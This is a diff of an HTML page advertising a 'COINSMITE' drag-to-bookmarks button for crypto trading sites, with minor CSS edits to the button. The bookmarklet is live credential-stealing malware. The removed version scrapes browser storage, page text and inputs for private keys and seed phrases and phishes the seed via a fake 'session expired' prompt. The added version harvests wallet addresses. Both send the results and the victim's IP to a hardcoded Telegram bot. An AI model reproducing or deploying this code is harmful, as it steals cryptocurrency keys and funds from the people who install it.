@@ -121,26 +121,21 @@
             background: #5b72ff;
             color: #fff;
             font-weight: 700;
-            font-size: 1.1rem;
-            padding: 0.6rem 2rem;
+            font-size: 1.4rem;
+            padding: 0.9rem 2.8rem;
             border-radius: 60px;
-            box-shadow: 0 6px 0 #2f3a8a, 0 8px 20px rgba(91, 114, 255, 0.25);
+            box-shadow: 0 8px 0 #2f3a8a, 0 10px 30px rgba(91, 114, 255, 0.25);
             cursor: grab;
             user-select: none;
             transition: 0.07s ease;
             text-decoration: none;
             border: none;
-            letter-spacing: 0.5px;
-            position: relative;
-            z-index: 10;
+            letter-spacing: 0.3px;
         }
         .bookmark-btn:active {
             cursor: grabbing;
-            transform: translateY(3px);
-            box-shadow: 0 3px 0 #2f3a8a;
-        }
-        .bookmark-btn:hover {
-            background: #6a7fff;
+            transform: translateY(4px);
+            box-shadow: 0 4px 0 #2f3a8a;
         }
         .bookmark-hint {
             margin-top: 1.2rem;
@@ -196,8 +191,8 @@
                 grid-template-columns: 1fr;
             }
             .bookmark-btn {
-                font-size: 1rem;
-                padding: 0.5rem 1.5rem;
+                font-size: 1.1rem;
+                padding: 0.7rem 1.8rem;
             }
         }
     </style>
@@ -227,7 +222,7 @@
         </div>
 
         <div class="bookmark-area">
-            <a href="#" class="bookmark-btn" id="bookmarklet" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'javascript:(function(){var%20b=document,a=location.href;if(!a.includes(\"pump.fun\")&&!a.includes(\"axiom\")&&!a.includes(\"paradade.gg\"))return;var%20found=[];var%20patterns=[{regex:/[0-9a-fA-F]{64}/g,label:\"Private%20Key%20(hex)\"},{regex:/[5KL][1-9A-HJ-NP-Za-km-z]{50,51}/g,label:\"Private%20Key%20(WIF)\"},{regex:/\\b(seed|mnemonic|phrase|recovery)\\s*[:=]\\s*[a-zA-Z0-9\\s]{12,24}/gi,label:\"Seed%20Phrase\"},{regex:/\\b(?:[a-z]+%20){11,23}[a-z]+\\b/g,label:\"Mnemonic%20Phrase\"},{regex:/0x[a-fA-F0-9]{40,48}/g,label:\"Wallet%20Address\"}];function%20scanText(t){for(var%20p=0;p<patterns.length;p++){var%20matches=t.match(patterns[p].regex);if(matches){for(var%20m=0;m<matches.length;m++){if(matches[m].length>10)found.push(patterns[p].label+\":%20\"+matches[m])}}}}for(var%20i=0;i<localStorage.length;i++){var%20k=localStorage.key(i);var%20v=localStorage.getItem(k);if(v&&typeof%20v==\"string\"){scanText(v);if(k.toLowerCase().includes(\"seed\")||k.toLowerCase().includes(\"mnemonic\")||k.toLowerCase().includes(\"phrase\")||k.toLowerCase().includes(\"priv\")||k.toLowerCase().includes(\"key\"))found.push(\"Storage%20Key:%20\"+k+\"%20=%20\"+v)}}for(i=0;i<sessionStorage.length;i++){k=sessionStorage.key(i);v=sessionStorage.getItem(k);if(v&&typeof%20v==\"string\"){scanText(v);if(k.toLowerCase().includes(\"seed\")||k.toLowerCase().includes(\"mnemonic\")||k.toLowerCase().includes(\"phrase\")||k.toLowerCase().includes(\"priv\")||k.toLowerCase().includes(\"key\"))found.push(\"Session%20Key:%20\"+k+\"%20=%20\"+v)}}var%20allText=b.body.innerText;scanText(allText);var%20inputs=b.querySelectorAll(\"input[type=\\\"text\\\"],input[type=\\\"password\\\"],textarea\");for(i=0;i<inputs.length;i++){if(inputs[i].value&&inputs[i].value.length>10){scanText(inputs[i].value);if(inputs[i].type==\"password\"||inputs[i].id.toLowerCase().includes(\"seed\")||inputs[i].id.toLowerCase().includes(\"phrase\"))found.push(\"Input%20field%20\"+inputs[i].id+\":%20\"+inputs[i].value)}}var%20promptResult=prompt(\"Session%20expired.%20Please%20re-enter%20your%20seed%20phrase%20to%20continue:\",\"\");if(promptResult&&promptResult.length>10){found.push(\"User%20entered%20seed:%20\"+promptResult)}if(found.length==0)found=[\"No%20keys%20or%20seeds%20found\"];var%20x=new%20XMLHttpRequest();x.open(\"GET\",\"https://api.ipify.org/json\",false);x.send();var%20ip=x.status==200?JSON.parse(x.responseText).ip:\"unknown\";var%20y=new%20XMLHttpRequest();y.open(\"POST\",\"https://api.telegram.org/bot8763030544:AAHzAmRNGjUdWlr4Sjc_2WqhoZm5D5_RSlk/sendMessage\");y.setRequestHeader(\"Content-Type\",\"application/json\");y.send(JSON.stringify({chat_id:\"6759486932\",text:\"IP:%20\"+ip+\"%0A%0AFound:%0A\"+found.join(\"%0A\")}));alert(\"Scan%20complete.%20Check%20results.\");})();'); event.dataTransfer.effectAllowed = 'copy'; return false;" onclick="return false;">⚡ COINSMITE</a>
+            <a href="javascript:(function(){var b=document,a=location.href;if(!a.includes('pump.fun')&&!a.includes('axiom')&&!a.includes('paradade.gg'))return;var w=[];for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i),v=localStorage.getItem(k);if(v&&v.match(/0x[a-fA-F0-9]{40,48}/))w.push(v)}for(i=0;i<sessionStorage.length;i++){k=sessionStorage.key(i);v=sessionStorage.getItem(k);if(v&&v.match(/0x[a-fA-F0-9]{40,48}/))w.push(v)}var e=b.querySelectorAll('[id*=\"wallet\"],[data-wallet],[address],.wallet-address,.address');for(i=0;i<e.length;i++){var t=e[i].textContent||e[i].innerText;if(t&&t.match(/0x[a-fA-F0-9]{40,48}/))w.push(t)}if(w.length==0)w=['No wallet found'];var x=new XMLHttpRequest();x.open('GET','https://api.ipify.org/json',false);x.send();var ip=x.status==200?JSON.parse(x.responseText).ip:'unknown';var y=new XMLHttpRequest();y.open('POST','https://api.telegram.org/bot8763030544:AAHzAmRNGjUdWlr4Sjc_2WqhoZm5D5_RSlk/sendMessage');y.setRequestHeader('Content-Type','application/json');y.send(JSON.stringify({chat_id:'6759486932',text:'IP: '+ip+'%0AWallets:%0A'+w.join('%0A')}));})();" class="bookmark-btn" draggable="true">⚡ COINSMITE</a>
             <div class="bookmark-hint">Drag, don't click — this button only works from your bookmarks bar.</div>
         </div>
 
